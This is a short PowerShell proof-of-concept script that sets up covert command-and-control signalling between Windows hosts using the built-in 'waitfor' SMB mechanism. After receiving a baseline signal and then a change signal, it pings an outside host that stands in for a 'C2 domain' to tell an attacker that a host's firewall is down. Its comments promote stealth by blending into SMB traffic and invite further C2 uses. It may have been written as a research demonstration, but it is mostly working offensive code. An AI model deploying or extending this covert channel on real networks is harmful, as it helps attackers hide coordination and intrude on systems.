<#
20151106 - Windows Lan to Lan Signals Intelligence Server v1.0

https://github.com/dc401
dchow[AT]xtecsystems.com
 
Basic PoC signaling script for Windows 7x or higher machines to generate
codified signals to each other and to take action based on case conditions.
A baseline signal is established and changes to the baseline case will be
evaluated and action taken based on this change.

The script demonstrates basic stealth using existing SMB transmissions chatter,
codification of words only useful to the operator, and is resourceful because
of no need to pull down external tools

Syntax:
winL2L_SIGC2_Server.ps1 baseSignal changeSignal

Example: WinL2L_SIGC2_Server.ps1 foobar woot


#>

#CLI arguments
param([string]$base, [string]$sig)

#$base = "foobar"
#$sig = "woot"

#Loop Counter Var
$baseSignalCount = 0
$changeSignalCount = 0

#Receive the baseline signal at least 3 times to confirm source
DO
{
    $baseSignalRec = [string](waitfor $base /t 11)

    IF ($baseSignalRec -like "*SUCCESS*")
    {
        $baseSignalCount++
    }
}
WHILE ($baseSignalCount -lt 3)

Write-Host "Received at least 3 correct base signals."

DO
{
    #Listen for change signal specified for up to 11 seconds
    $changeSignalRec = [string](waitfor $sig /t 11)

    IF ($changeSignalRec -like "*SUCCESS*")
    {
        $changeSignalCount++
        <#
        We don't use case logic because the waitfor output doesn't
        have any other output for receiving different signals

        Ping our an outside C2 domain 2 times to let bad guy
        know that the firewall on the host the client script
        is running is now down

        Use your imagination for what else you could do with signaling
        in a C2 (command and control) like method using codification
        #>
        ping -n 2 google.com
        Write-Host "Firewall is DOWN!"
    }
}
#stop condition of do while
WHILE ($changeSignalCount -lt 1)
exit
